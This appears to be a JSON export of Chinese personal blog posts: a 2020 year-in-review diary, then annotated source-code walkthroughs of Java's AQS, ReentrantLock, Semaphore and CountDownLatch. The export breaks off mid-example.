[{"title":"2020 All","url":"/2020/12/29/2021/2020-All/","content":"\n\n2019-2020本年度工作\n一月份：回老家太冷，废物\n二月份：随机汇编，依旧没做事\n三月份：回广东，练习CTF\n四月份：练习CTF，做Leetcode\n五月份：稍微玩了点Android，练习CTF，做Leetcode，做数模\n六月份：玩了点机器学习，学习Java，做Leetcode\n七月份：废物\n八月份：和小方，蔡蔡做数模\n九月份：Java\n十月份：大创 java 科技节\n十一月份：大创 java Leetcode\n十二月份：废物\n总的来说，这一年其实没有做什么\n大都是很简单，很容易的事情\n但是在学习和技术之外\n也有和母上大人吃吃喝喝，和父上大人怼怼怼怼。\n也遇到有趣的伙伴，\n和谐相处的队友。\n可惜还是没有喜欢的女孩子滏–\n回顾一年，其实自己并没有那么难\n但是一年嘛，人总是会改变的，所以总的来说还是有些变化\n我自己觉得 变得冷静 变得稍微成熟一点了\n【其实我也不太清楚 在大多数人面前我都挺随意的–\n【但是处理事情，我就会变得稳重一点，不那么跳脱-自己觉得\n","tags":["2020"]},{"title":"AQS源码与Lock","url":"/2021/04/29/2021/AQS%E5%BA%94%E7%94%A8%E4%B9%8BLock/","content":"\n\n什么是AQSJava并发编程核心在于java.concurrent.util包，而juc当中的大多数同步器实现都是围绕着共同的基础行为，比如等待队列、条件队列、独占获取、共享获取等，而这个行为的抽象就是基于AbstractQueuedSynchronizer简称AQS，AQS定义了一套多线程访问共享资源的同步器框架，是一个依赖状态(state)的同步器。\n我们常用的各种同步组件或者锁都是基于这个框架实现的，一般都是通过定义内部类Sync继承AQS将同步器所有调用都映射到Sync对应的方法 。\nAQS的特性首先大家需要简单了解AQS中的一些特性。\n三大核心原理\n自旋，LocksSuport, CAS，queue队列\n资源状态AQS中定义了一个状态变量，用于描述当前资源的状态：\n/** * The synchronization state.*///状态变量\tprivate volatile int state;\n\n\n0：表示当前资源可用，比如锁已被某个线程占用\n1：表示当前资源不可用\n\n资源共享方式AQS定义两种资源共享方式：\n\nExclusive(独占)：只有一个线程能执行，如ReentrantLock。在独享方式下，AQS的父类AbstractOwnableSynchronizer中的包含一个字段，用于指向独享资源的线程：\n\n// 当前持有资源的线程private transient Thread exclusiveOwnerThread;\n\n\nShare(共享)：多个线程可以同时执行，如Semaphore和CountDownLatch。\n\n两种队列不同的自定义同步器的特性不同，因此争用共享资源的方式也不同。自定义同步器在实现时只需要实现共享资源的获取与释放方式即可，至于具体线程等待队列的维护（如获取资源失败入队&#x2F;唤醒出队等），AQS已经在顶层实现好了。\nAQS中主要包括以下两种队列：\n同步等待队列AQS当中的同步等待队列也称CLH队列，CLH队列是Craig、Landin、Hagersten三人发明的一种基于双向链表数据结构的队列，是FIFO先入先出线程等待队列。\n同步器依赖内部的同步队列来完成同步状态的管理，当前线程获取资源失败时，同步器会将当前线程以及等待状态等信息构造成称为一个节点(Node)并将其加入同步队列，同时会阻塞当前线程，当同步资源释放时，会把首节点中的线程唤醒，使其再次尝试获取同步资源。链表的结点是AQS中的内部类：\n// 链表的节点,AbstractQueuedSynchronizer的内部类static final class Node &#123;        // 共享模式    static final Node SHARED = new Node();        // 互斥(独占)模式    static final Node EXCLUSIVE = null;    // 节点的四个生命状态    static final int CANCELLED =  1;    static final int SIGNAL    = -1;    static final int CONDITION = -2;    static final int PROPAGATE = -3;    /** 节点的生命状态（信号量）      * SIGNAL = -1 可被唤醒      * CANCELLED = 1 出现异常，中断引起的，需要废弃结束      * CONDITION = -2 条件等待，用于条件等待队列，不用于CLH      * PROPAGATE = -3 传播      * 0 初始状态(默认)      * 为了保证所有阻塞线程对象能够被唤醒      */    volatile int waitStatus;    // 前驱节点    volatile Node prev;    // 后继节点    volatile Node next;    // 节点同步状态的线程    volatile Thread thread;    // 该字段用于条件等待队列，不用于CLH队列    Node nextWaiter;    // 判断是否是共享模式    final boolean isShared() &#123;        return nextWaiter == SHARED;    &#125;    // 获取结点的前驱节点    final Node predecessor() throws NullPointerException &#123;        Node p = prev;        if (p == null)            throw new NullPointerException();        else            return p;    &#125;    // 构造方法    Node() &#123;        &#125;    Node(Thread thread, Node mode) &#123;             this.nextWaiter = mode;        this.thread = thread;    &#125;    Node(Thread thread, int waitStatus) &#123;         this.waitStatus = waitStatus;        this.thread = thread;    &#125;&#125;\n\n一个CLH队列的结构大致如下：\n\n其头节点和尾结点对应AQS的两个字段：\n// CLH双向链表的head头节点// 懒加载，由第一个进入等待队列的线程结点加载// head恒为空结点，即其中的thread为nullprivate transient volatile Node head;// CLH双向链表的tail尾结点，排在队列最后的线程结点private transient volatile Node tail;\n\n条件等待队列与CLH队列不同，Condition是一个多线程间协调通信的工具类，使得某个或者某些线程一起等待某个条件（Condition），只有当该条件具备时，这些等待线程才会被唤醒，从而重新争夺锁。AQS中条件等待队列的结构如下图所示：\n\n与CLH队列相比，条件等待队列是一个单向链表，并且它的所有节点都不为空(CLH中的头节点为空)。条件等待队列同样也是基于Node构建的：\n// 链表的节点,AbstractQueuedSynchronizer的内部类static final class Node &#123;    // 条件等待队列中指向下一个节点的指针    Node nextWaiter;&#125;// ConditionObject是AQS中对Condition的实现public class ConditionObject implements Condition, java.io.Serializable &#123;        // 条件等待队列中的头节点    private transient Node firstWaiter;        // 条件等待队列中的尾节点    private transient Node lastWaiter;&#125;\n\n多线程安全性AQS如何保证多线程并行下操作的安全性？AQS中使用了volatile关键字修饰变量，并且通过CAS原子操作对这些volatile变量进行修改，保证了多线程情况下操作的原子性和可见性。\nAQS在类加载初始化阶段，会执行类中最后部分的静态代码块，完成对类中几个字段的偏移量的初始化，方便后续的CAS操作。\n主要都是CAS操作，compare and swap是很好的原子获取值。\nAQS源码分析这是我第一次进行源码分析！\n大局看粗略的看加锁和解锁流程，如下图：\n\npublic class ReentrantLock implements Lock, java.io.Serializable &#123;    private static final long serialVersionUID = 7373984872572414699L;    // 这里是继承了AQS    private final Sync sync;    //这里前置工作做好了    public ReentrantLock() &#123;        //默认不公平锁        sync = new NonfairSync();    &#125;    //进行构造函数判定是否公平锁    public ReentrantLock(boolean fair) &#123;        sync = fair ? new FairSync() : new NonfairSync();    &#125;   //使用的锁是调用sync    public void lock() &#123;        sync.lock();    &#125;    //使用另外一种加锁方式    public void lockInterruptibly() throws InterruptedException &#123;        sync.acquireInterruptibly(1);    &#125;    //解锁方式    public void unlock() &#123;        sync.release(1);    &#125;&#125;\n\n接下来我们看下Sync\n//这里还是虚拟类abstract static class Sync extends AbstractQueuedSynchronizer &#123;    private static final long serialVersionUID = -5179523762034025860L;     //对应的lock    abstract void lock();    //加锁逻辑    final boolean nonfairTryAcquire(int acquires) &#123;        final Thread current = Thread.currentThread();        int c = getState();                if (c == 0) &#123;            if (compareAndSetState(0, acquires)) &#123;                setExclusiveOwnerThread(current);                return true;            &#125;        &#125;        else if (current == getExclusiveOwnerThread()) &#123;            int nextc = c + acquires;            if (nextc &lt; 0) // overflow                throw new Error(&quot;Maximum lock count exceeded&quot;);            setState(nextc);            return true;        &#125;        return false;    &#125;        //释放锁的逻辑    protected final boolean tryRelease(int releases) &#123;        int c = getState() - releases;        if (Thread.currentThread() != getExclusiveOwnerThread())            throw new IllegalMonitorStateException();        boolean free = false;        if (c == 0) &#123;            free = true;            setExclusiveOwnerThread(null);        &#125;        setState(c);        return free;    &#125;&#125;\n\n而对应的有公平锁和非公平锁的继承\n//其实最后还是用的这个Syncstatic final class NonfairSync extends Sync &#123;    private static final long serialVersionUID = 7316153563782823691L;    //实现对应的方法    final void lock() &#123;        if (compareAndSetState(0, 1))            setExclusiveOwnerThread(Thread.currentThread());        else            acquire(1);    &#125;    protected final boolean tryAcquire(int acquires) &#123;        return nonfairTryAcquire(acquires);    &#125;&#125;/** * Sync object for fair locks */static final class FairSync extends Sync &#123;    private static final long serialVersionUID = -3000897897090466540L;    final void lock() &#123;        //进行加锁        acquire(1);    &#125;    //这里很重要！！    /**     * 如果获取到锁，或者重入锁，那么返回true     * 否则返回false     */    protected final boolean tryAcquire(int acquires) &#123;        //当前线程是否        //在acquire的里面会有这个调用        //看是否是第一次获取还是没有获取        final Thread current = Thread.currentThread();        int c = getState();        //判读是否锁空闲        if (c == 0) &#123;            if (!hasQueuedPredecessors() &amp;&amp;                compareAndSetState(0, acquires)) &#123;                setExclusiveOwnerThread(current);                return true;            &#125;        &#125;        else if (current == getExclusiveOwnerThread()) &#123;            int nextc = c + acquires;            if (nextc &lt; 0)                throw new Error(&quot;Maximum lock count exceeded&quot;);            setState(nextc);            return true;        &#125;        return false;    &#125;&#125;\n\n首先我们说说，ReentrantLock和synchronized它们两的区别：\n\nSynchronized是JVM层次的锁实现，ReentrantLock是JDK层次的锁实现\nSynchronized的锁状态是无法在代码中直接判断的，但是ReentrantLock可以通过lock.isLocked()判断\nSynchronized是非公平锁，ReentrantLock是可以是公平也可以是非公平的\nSynchronized是不可以被强行中断的，而ReentrantLock通过lock.lockInterruptibly()方法加锁的话，是可以被强行中断的\n在发生异常时Synchronized会自动释放锁（由javac编译时自动实现），而ReentrantLock需要开发者在finally块中释放锁\nReentrantLock获取锁的形式有多种：如立即返回是否成功的tryLock(),以及等待指定时长的获取，更加灵活\n\n加锁我们先进行加锁的思路走，可以发现无论是公平锁还是非公平锁都是调用acquire(1);进行加锁的\npublic final void acquire(int arg) &#123;    /**     * tryAcquire 是调用公平锁和非公平锁中的代码     * 这部分代码可以拆解 acquireQueued(addWaiter(Node.EXCLUSIVE), arg)     * 这是添加进同步等待队列中     * addWaiter(Node.EXCLUSIVE)     * 这里是把本线程进入阻塞     * acquireQueued(Node, arg)     * 这里很重要的是if逻辑是否会进去     * 如果进去的话需要会进行自我中断，这是因为acquireQueue返回true是中断产生！     */    if (!tryAcquire(arg) &amp;&amp;        acquireQueued(addWaiter(Node.EXCLUSIVE), arg))        //如果进入这里说明一开始没有获取到锁，进入等待队列中，获取到了锁        //但是获取锁是依靠中断的        //那么由于acquireQueued中我们使用的Thread.interrupted();        //导致中断信号被清空，所以需要再添加上中断信号        selfInterrupt();&#125;\n\n我们一步步来，先看tryAcquire\n  //其实最后还是用的这个Sync  static final class NonfairSync extends Sync &#123;      /**       * 看的出来由于是非公平锁       * 那么调用Sync的nonfairTryAcquire(acquires)       */      protected final boolean tryAcquire(int acquires) &#123;          return nonfairTryAcquire(acquires);      &#125;  &#125;  static final class FairSync extends Sync &#123;//调用这里的方法      protected final boolean tryAcquire(int acquires) &#123;          //获取当前线程          final Thread current = Thread.currentThread();          //获取当前锁状态          int c = getState();          //如果锁是空闲的          if (c == 0) &#123;              //把锁状态由0-&gt;acquires              if (!hasQueuedPredecessors() &amp;&amp;                  compareAndSetState(0, acquires)) &#123;                  setExclusiveOwnerThread(current);                  return true;              &#125;          &#125;          //如果锁不空闲 判断此刻拥有锁的线程是否是本线程          //重入锁的原理          else if (current == getExclusiveOwnerThread()) &#123;              //锁状态+1              int nextc = c + acquires;              if (nextc &lt; 0)                  throw new Error(&quot;Maximum lock count exceeded&quot;);              //这里不使用CAS是因为              //仅仅只会有本线程进入锁，不必担心并发问题              setState(nextc);              return true;          &#125;          //如果锁不是空闲，又不是重入          return false;      &#125;  &#125;\n\n很清晰的获取锁的流程【单指公平锁。\n接下来我们根据\n//接下来我们看向addWaiter//我们开看   /**    * 这里使用的是同步等待队列    */   private Node addWaiter(Node mode) &#123;       //new一个节点       Node node = new Node(Thread.currentThread(), mode);       // Try the fast path of enq; backup to full enq on failure       Node pred = tail;       /**        * 这里通过尾节点是否为空判断是否需要初始化操作        * 初始化的话直接进入enq函数        */       if (pred != null) &#123;           //如果不需要初始化节点就会进入此处           //其实和enq里的类似           node.prev = pred;           if (compareAndSetTail(pred, node)) &#123;               pred.next = node;               //这里会直接返回的！！               return node;           &#125;       &#125;       enq(node);       return node;   &#125;   //这里是初始化才会进入这里   private Node enq(final Node node) &#123;       for (;;) &#123;           //这里自旋           Node t = tail;           //尾指针为空，那么初始化一个空节点           //使得首尾指针都指向这个空节点           if (t == null) &#123; // Must initialize               if (compareAndSetHead(new Node()))                   tail = head;           &#125; else &#123;           //不为空说明我们已经初始化好了               node.prev = t;               //设置尾节点为node               if (compareAndSetTail(t, node)) &#123;                   //使得前面节点和node链接                   t.next = node;                   return t;               &#125;           &#125;       &#125;   &#125;   //前面是把该线程放入同步等待队列   //现在是把该线程进行阻塞   /**    * 注意有个特点    * 如果你是同步等待队列中的第一个线程    * 那么不是直接阻塞，是看看还有机会获得锁吗？    * 如果没有机会才阻塞    */   final boolean acquireQueued(final Node node, int arg) &#123;       boolean failed = true;       try &#123;           boolean interrupted = false;           for (;;) &#123;               //自旋               final Node p = node.predecessor();               //判断是否是同步等待队列的第一个线程               //如果是的话 会 tryAcquire(arg)               if (p == head &amp;&amp; tryAcquire(arg)) &#123;                   //因为进入此处                   //代表已经获得锁了                   //那么需要把该节点从同步等待队列中丢弃                   setHead(node);                   p.next = null; // help GC                   failed = false;                   return interrupted;               &#125;               //由于不是第一个线程，故而直接阻塞               if (shouldParkAfterFailedAcquire(p, node) &amp;&amp;                   parkAndCheckInterrupt())                   //如果是被中断唤醒的，那么设为true                   interrupted = true;           &#125;       &#125; finally &#123;           //最终会判断是否获取到了锁？           //如果没获取到，说明这个线程走到这里是由于别的问题产生的！           if (failed)               cancelAcquire(node);       &#125;   &#125;\n\n我们已经分析完了从获取锁到如何进入等待队列，到阻塞线程。\n其中阻塞线程我们可以在深究一下。\n  //这里会对同步等待队列中的waitStatus  private static boolean shouldParkAfterFailedAcquire(Node pred, Node node) &#123;            int ws = pred.waitStatus;//判断这里是否为-1      if (ws == Node.SIGNAL)          //如果这里是-1，那么就直接返回          return true;      if (ws &gt; 0) &#123;          /*           * Predecessor was cancelled. Skip over predecessors and           * indicate retry.           */          do &#123;              node.prev = pred = pred.prev;          &#125; while (pred.waitStatus &gt; 0);          pred.next = node;      &#125; else &#123;\t//如果这里为0，那么我们将其转为-1          compareAndSetWaitStatus(pred, ws, Node.SIGNAL);      &#125;      return false;  &#125;  private final boolean parkAndCheckInterrupt() &#123;      //这里是把线程阻塞      LockSupport.park(this);      //被唤醒是有多种可能      //比如API唤醒，或者被中断      //如果是被中断唤醒的话，中断信号应该为true//这里是返回是否被中断      return Thread.interrupted();  &#125; \n\n我们看到了最终是阻塞在parkAndCheckInterrupt\n在这个自旋中\n\nwaitestate = 0 - &gt; -1 head节点为什么改到-1\n\n因为持有锁的线程T0在释放锁的时候，得判断head节点的waitestate是否!=0,如果！=0成立，会再把waitstate = -1-&gt;0\n解锁接下来我们看解锁过程\n//一.解锁public void unlock() &#123;       sync.release(1);   &#125; // 二.释放锁的方法   public final boolean release(int arg) &#123;       // 调用tryRelease判断是否锁空闲       if (tryRelease(arg)) &#123;           // 如果锁空闲，说明可以让其他线程获取锁           Node h = head;           // 如果头节点不为空，并且状态不为0，说明后面节点可以唤醒           if (h != null &amp;&amp; h.waitStatus != 0)               // 唤醒头节点后第一个满足条件的节点               unparkSuccessor(h);           //这里说明某个线程被唤醒了           return true;       &#125;   return false;   &#125;//解锁   private void unparkSuccessor(Node node) &#123;       /*        * If status is negative (i.e., possibly needing signal) try        * to clear in anticipation of signalling.  It is OK if this        * fails or if status is changed by waiting thread.        */       int ws = node.waitStatus;       if (ws &lt; 0)           compareAndSetWaitStatus(node, ws, 0);       /*        * Thread to unpark is held in successor, which is normally        * just the next node.  But if cancelled or apparently null,        * traverse backwards from tail to find the actual        * non-cancelled successor.        */       Node s = node.next;       if (s == null || s.waitStatus &gt; 0) &#123;           s = null;           for (Node t = tail; t != null &amp;&amp; t != node; t = t.prev)               if (t.waitStatus &lt;= 0)                   s = t;       &#125;       if (s != null)           //这里是真正的解锁！！           LockSupport.unpark(s.thread);   &#125;\n\n unparkSuccessor(h);\n看得出来这里是把头节点带入函数中，也就是说判断head节点的waitestate是否!=0,如果！=0成立，会再把waitstate = -1-&gt;0\nabstract static class Sync extends AbstractQueuedSynchronizer &#123;    private static final long serialVersionUID = -5179523762034025860L;    protected final boolean tryRelease(int releases) &#123;        // 状态变换        int c = getState() - releases;        // 当前线程不是锁持有线程，那么就抛出异常        if (Thread.currentThread() != getExclusiveOwnerThread())            throw new IllegalMonitorStateException();        boolean free = false;        //如果锁状态为空闲        if (c == 0) &#123;            free = true;            //设置锁持有线程为null            setExclusiveOwnerThread(null);        &#125;        setState(c);        return free;    &#125;&#125;\n\n\n\nlockInterruptibly()lockInterruptibly()也是Lock的一种加锁方式\n\n在普通的LockSupport.park()会判断是否有中断标记，如果有，那么不用阻塞。\n\n利用LockSupport.park()响应中断不会抛出异常的特性，之前的lock方法中，线程在被中断唤醒并且成功抢到锁后，只会修改线程的中断标记为true。\n而使用lockInterruptibly方法加锁，一旦线程被中断唤醒，线程状态就会被标记为CANCELLED，从队伍中被剔除并且抛出异常。\n话不多说，直接看源码：\n   //标准操作//注意到这里有抛出中断异常   public void lockInterruptibly() throws InterruptedException &#123;       //照旧调用sync       sync.acquireInterruptibly(1);   &#125;   //开始操作   public final void acquireInterruptibly(int arg)           throws InterruptedException &#123;       //如果被中断了，那么直接抛异常        if (Thread.interrupted())           throw new InterruptedException();       //否则就尝试获取锁       //如果获取不成功，那么进入代码       if (!tryAcquire(arg))           doAcquireInterruptibly(arg);   &#125;   //核心   private void doAcquireInterruptibly(int arg)       throws InterruptedException &#123;       //把线程加入同步等待队列       final Node node = addWaiter(Node.EXCLUSIVE);       boolean failed = true;       try &#123;           //开始自旋！！           for (;;) &#123;               //看头节点               final Node p = node.predecessor();               //如果可以就尝试获取锁               if (p == head &amp;&amp; tryAcquire(arg)) &#123;                   setHead(node);                   p.next = null; // help GC                   failed = false;                   return;               &#125;               //这里就是常态了，和lock的那个类似               if (shouldParkAfterFailedAcquire(p, node) &amp;&amp;                   parkAndCheckInterrupt())                   //差别在这里，一旦出现中断                   //那么直接抛出异常，而不是接着获取锁                   throw new InterruptedException();           &#125;       &#125; finally &#123;           //由于中断，所以会把failed是true，会进入if代码中           if (failed)               // 将当前线程节点从队列中剔除               //此时没有获取锁               cancelAcquire(node);       &#125;   &#125;   // 将当前线程节点从队列中剔除的方法   private void cancelAcquire(Node node) &#123;       if (node == null)           return;       // 当前节点中的thread置为null       node.thread = null;       // 获取当前节点的前驱节点       Node pred = node.prev;       // 找到队伍中连续状态为CANCELLED的第一个节点的前驱结点pred       while (pred.waitStatus &gt; 0)           node.prev = pred = pred.prev;       // predNext为队伍中连续状态为CANCELLED的第一个节点       Node predNext = pred.next;       // 当前节点的状态设置为CANCELLED       node.waitStatus = Node.CANCELLED;       // 以下操作把pedfNext到node的所有结点从队中剔除,因为这些结点的状态均为CANCELLED       if (node == tail &amp;&amp; compareAndSetTail(node, pred)) &#123;           // 1.如果node是队尾,将pred(predNext的前驱节点)设为队尾           compareAndSetNext(pred, predNext, null);       &#125; else &#123;           int ws;           // 2.如果pred不是队头           if (pred != head &amp;&amp;               // 并且pred的状态不为(-1)               ((ws = pred.waitStatus) == Node.SIGNAL ||               // 或者pred的状态&lt;=0(0)并且CAS将其替换为-1成功               (ws &lt;= 0 &amp;&amp; compareAndSetWaitStatus(pred, ws, Node.SIGNAL))) &amp;&amp;               // 并且pred中的thread不为空               pred.thread != null) &#123;               // 获取node的后继节点next               Node next = node.next;               // 如果next不为空且状态&lt;=0               if (next != null &amp;&amp; next.waitStatus &lt;= 0)                   // 将pred的后继节点设置为next                   compareAndSetNext(pred, predNext, next);           &#125; else &#123;               // 3.如果node是队头，调用unparkSuccessor方法唤醒node后第一个满足条件的节点               unparkSuccessor(node);           &#125;              node.next = node;        &#125;   &#125;   // 唤醒当前节点满足条件的后继节点   private void unparkSuccessor(Node node) &#123;              int ws = node.waitStatus;       if (ws &lt; 0)           // 将node节点的状态置为0           compareAndSetWaitStatus(node, ws, 0);       // 获取node的后继节点s       Node s = node.next;       // 如果s为空或者s的状态为CANCELLED       if (s == null || s.waitStatus &gt; 0) &#123;           s = null;           // 找到node后面第一个状态小于0(-1)的节点t           for (Node t = tail; t != null &amp;&amp; t != node; t = t.prev)               if (t.waitStatus &lt;= 0)                   // 将t赋值给s                   s = t;       &#125;       if (s != null)           // 将s唤醒           LockSupport.unpark(s.thread);   &#125;\n\n简单来说，lock 与 lockInterruptibly 区别在于：\nlock 优先考虑获取锁，待获取锁成功后，才响应中断；\nlock的中断处理是在acquire方法中加上了中断信号标志而已。\n而lockInterruptibly 优先考虑响应中断，一旦中断就不再继续获取锁\n他的中断处理是我不要锁了，直接把这个线程中断，然后删除种种信息。\n偏重点不同。\n","tags":["2021"]},{"title":"CountDownLatch&Semaphore","url":"/2021/05/03/2021/CountDownLatch-Semaphore/","content":"\n\nSemaphoreSemaphore 字面意思是信号量的意思，它的作用是控制访问特定资源的线程数目，底层依赖AQS的状态State，是在生产当中比较常用的一个工具类。\n使用 Semaphore构造方法public Semaphore(int permits) public Semaphore(int permits, boolean fair)             \n\n\npermits 表示许可线程的数量\nfair 表示公平性，如果这个设为 true 的话，下次执行的线程会是等待最久的线程\n\n重要方法\n构造方法\n\n\n\n\n方法\n说明\n\n\n\nSemaphore(int permits)\npermits 表示许可线程的数量\n\n\nSemaphore(int permits, boolean fair)\nfair 表示公平性，如果设为 true ，下次执行的线程会是等待最久的线\n\n\n\n获取信号量\n\n\n\n\n方法\n说明\n\n\n\nacquire()\n获取一个信号量，如果线程被中断会抛异常\n\n\nacquire(int permits)\n获取permits个信号量\n\n\nacquireUninterruptibly()\n获取一个信号量，如果线程被中断不会抛异常\n\n\nacquireUninterruptibly(int permits)\n获取permits个信号量\n\n\ntryAcquire(long timeout, TimeUnit unit)\n尝试获取信号量，timeout时间后未获取到返回false\n\n\ntryAcquire(int permits, long timeout, TimeUnit unit)\n获取permits个信号量\n\n\n\n释放信号量\n\n\n\n\n方法\n说明\n\n\n\nrelease()\n释放一个信号量\n\n\nrelease(int permits)\n释放permits个信号量\n\n\n案例Semaphore可以用于做流量控制，特别是公用资源有限的应用场景。假如当前有10个线程同时请求我们的服务，但是我们服务最多能承受的并发量为2，我们通过Semaphore对流量进行控制：\npackage Basic;import java.util.concurrent.Semaphore;/** * @description: * @author: Liduoan * @time: 2021/5/5 */public class Semp &#123;    static Semaphore semaphore = new Semaphore(2);    public static class Thread1 implements Runnable&#123;        @Override        public void run() &#123;            try &#123;                semaphore.acquire();                System.out.println(Thread.currentThread().getName() + &quot;semaphore.acquire(1);&quot;);                Thread.sleep(1000);                semaphore.release();                System.out.println(Thread.currentThread().getName() + &quot;release();&quot;);            &#125; catch (InterruptedException e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;    public static void main(String[] args) &#123;        for (int i = 0; i &lt; 10; i++) &#123;            new Thread(new Thread1()).start();        &#125;    &#125;&#125;\n\n从打印结果可以看出，一次只有两个线程执行 acquire()，只有线程进行 release() 方法后才会有别的线程执行 acquire()。\n源码分析Semaphore也是基于AQS框架实现的一种共享式锁，因此它的实现流程和ReentrantLock类似。\nAcquire本文以公平锁为例，之前我们介绍了ReentrantLock公平锁的详细原理，它的独占式是依靠状态量state来实现的，当state=0时，表示资源空闲；当state&gt;0时表示资源被占用。\n而Semaphore这种共享式锁的实现同样是依靠state来实现，但是与前者相反：当state=0时，表示资源已被用完；当state=n(n&gt;0)时，表示剩余资源数为n。\n而两者对于获取资源失败，需要被阻塞的线程的处理相似，它们都会被加入CLH队列中等待唤醒。只是共享式锁同时可以有多个线程占用资源。下面我们就来看看源码。\npublic void acquire() throws InterruptedException &#123;    //信号量减一    sync.acquireSharedInterruptibly(1);&#125;public final void acquireSharedInterruptibly(int arg)        throws InterruptedException &#123;    //如果有中断信号    if (Thread.interrupted())        //抛出中断异常        throw new InterruptedException();    //尝试获取信号量    //如果减少后的信号量小于0才进行后续操作    //否则就直接返回了！！！    if (tryAcquireShared(arg) &lt; 0)        //加入阻塞队列        doAcquireSharedInterruptibly(arg);&#125;protected int tryAcquireShared(int acquires) &#123;    for (;;) &#123;        if (hasQueuedPredecessors())            return -1;        //获取状态        int available = getState();        //信号量变化        int remaining = available - acquires;        //如果信号量不够，那么直接返回        //如果信号量够，那么CAS操作        //最后都是返回减少后的信号量        if (remaining &lt; 0 ||            compareAndSetState(available, remaining))            return remaining;    &#125;&#125;private void doAcquireSharedInterruptibly(int arg)    throws InterruptedException &#123;    //首先加入CLH队列中    final Node node = addWaiter(Node.SHARED);    boolean failed = true;    try &#123;        //尝试阻塞线程        for (;;) &#123;            //前置节点            final Node p = node.predecessor();            //如果本线程的前节点是头节点            //说明本线程是队列中第一个            if (p == head) &#123;                //尝试获取信号量                int r = tryAcquireShared(arg);                //如果返回值大于=0                //说明当前信号量是够的！                //这里是因为CAS操作在tryAcquireShared                //所以返回的值是可以确定本线程是否拿取这个信号量！                if (r &gt;= 0) &#123;                    //把本线程节点设置未头节点                    setHeadAndPropagate(node, r);                    //把头节点的地方抛弃 协助GC                    p.next = null; // help GC                    failed = false;                    //此时本线程获取了信号量，从CLH队列中释放                    //完成了所有操作                    return;                &#125;            &#125;            //如果本线程节点不是第一个线程节点            //那么尝试阻塞本线程            //首先更改前节点的waitStatus            if (shouldParkAfterFailedAcquire(p, node) &amp;&amp;                //进行阻塞处理                parkAndCheckInterrupt())                //如果被唤醒，可能是由于被中断或者被主动唤醒                //被中断唤醒的话，if判断未true                //那么抛出异常                throw new InterruptedException();        &#125;    &#125; finally &#123;        //被中断唤醒的话，failed是true        //导致对CLH队列中进行删除处理！        if (failed)            cancelAcquire(node);    &#125;&#125;\n\n可用看到和ReetrantLock的流程较为相似，主要就是分为三步：\n\n尝试获取锁：获取共享锁时对于state的操作做减法，如果小于0说明资源数量不够，获取失败\n获取失败后入队阻塞：获取锁失败后需要加入CLH队列排队，不过加入之前同样存在自旋操作\n获取锁成功后唤醒线程：这也是与独占式锁的最大不同之处，在共享模式下，一旦一个阻塞线程被唤醒并且成功获取共享资源后，它还会唤醒CLH队列中的其他线程。\n\nRelease释放资源的流程相对来说比较简单，主要就是归还资源，即修改state的值和唤醒其它线程。Semaphore类：\n// 一.开始释放信号量public void release() &#123;    // 调用AQS的releaseShared    sync.releaseShared(1);&#125;// Semaphore的内部类FairSyncstatic final class FairSync extends Sync &#123;     // 四.尝试释放信号量的方法    protected final boolean tryReleaseShared(int releases) &#123;        for (;;) &#123;            // 获取当前资源状态            int current = getState();            // 归还资源            int next = current + releases;            if (next &lt; current)                // 归还后如果比当前还少，说明有异常                throw new Error(&quot;Maximum permit count exceeded&quot;);            // 归还成功后通过CAS修改资源状态            if (compareAndSetState(current, next))                // 资源状态修改成功则表示释放成功，否则自旋                return true;        &#125;    &#125;&#125;\n\nAbstractQueuedSynchronizer类：\n// 二.释放信号量public final boolean releaseShared(int arg) &#123;    // 调用tryReleaseShared方法尝试释放    if (tryReleaseShared(arg)) &#123;        // 如果释放成功，调用doReleaseShared方法        doReleaseShared();        return true;    &#125;    return false;&#125;// 三.尝试释放信号量，由子类实现protected boolean tryReleaseShared(int arg) &#123;    throw new UnsupportedOperationException();&#125;\n\nCountDownLatch什么是CountDownLatchCountDownLatch这个类能够使一个线程等待其他线程完成各自的工作后再执行。\n例如，应用程序的主线程希望在负责启动框架服务的线程已经启动所有的框架服务之后再执行。在Zookeeper分布式锁，Jmeter模拟高并发等场景中被使用。 它的原理也很简单：\nCountDownLatch是通过一个计数器来实现的，计数器的初始值为线程的数量。每当一个线程完成了自己的任务后，计数器的值就会减1。当计数器值到达0时，它表示所有的线程已经完成了任务，然后在闭锁上等待的线程就可以恢复执行任务。\n怎么使用CountDownLatchAPI\n构造方法\n\n\n\n\n方法\n说明\n\n\n\nCountDownLatch(int count)\ncount表示CountDownLatch的初始值\n\n\n\n计数值操作\n\n\n\n\n方法\n说明\n\n\n\ncountDown()\n计数值减1\n\n\ngetCount()\n获取当前计数值\n\n\n\n等待方法\n\n\n\n\n方法\n说明\n\n\n\nawait()\n等待计数值为0\n\n\nawait(long timeout, TimeUnit unit)\n等待计数值为0，超过timeout时长返回false\n\n\n案例一CountDownLatch这个类能够使一个线程等待其他线程完成各自的工作后再执行，我们模拟一个这样的场景：我们处理大量数据时，将数据进行分块处理，安排多个线程同时处理不同块的数据；而主线程需要等待所有的数据处理完后，再进行数据的总体分析。代码如下：\npublic class CountDownLaunchTest1 &#123;    // 创建countDownLatch，初始计数值为3    static CountDownLatch countDownLatch = new CountDownLatch(3);    public static void main(String[] args) &#123;        try &#123;            // 创建3个线程启动，模拟处理3块数据            for (int i = 1; i &lt;= 3; i++) &#123;                new Task(i).start();            &#125;            // 等待3个线程执行完毕            countDownLatch.await();            System.out.println(&quot;所有数据都处理完了，开始总体分析&quot;);        &#125; catch (InterruptedException e) &#123;            e.printStackTrace();        &#125;    &#125;    // 分块处理数据的线程类    private static class Task extends Thread &#123;        // 数据的块号        private int id;        public Task(int id) &#123;            this.id = id;        &#125;        @Override        public void run() &#123;            try &#123;                System.out.println(&quot;处理第&quot; + id + &quot;块数据&quot;);                // 模拟数据处理时间                TimeUnit.SECONDS.sleep(id);            &#125; catch (InterruptedException e) &#123;                e.printStackTrace();            &#125; finally &#123;                // 数据处理完后，计数值减1                countDownLatch.countDown();            &#125;        &#125;    &#125;&#125;\n\n这个还是比较容易理解的，每个线程执行完毕后将计数值减1，主线程等待计数值为0时就可以从await()开始继续执行了。\n当然也可以使用带有超时时长的await()方法进行处理。\n另外通过thread.join()方法也可以实现这一的需求，join()方法就是等待该线程执行完成后才会继续往下执行，但是如果线程很多的话写起来相对比较麻烦。\n案例二CountDownLatch本身就有倒计时的意思，因此它也有让所有线程同时开始某个操作的功能。我们就模拟一场跑步比赛，所有运动员准备就绪后，听到裁判的哨声后才能同时启动。代码如下：\npublic class CountDownLaunchTest2 &#123;    // 创建countDownLatch，初始计数值为1，模拟裁判    static CountDownLatch countDownLatch = new 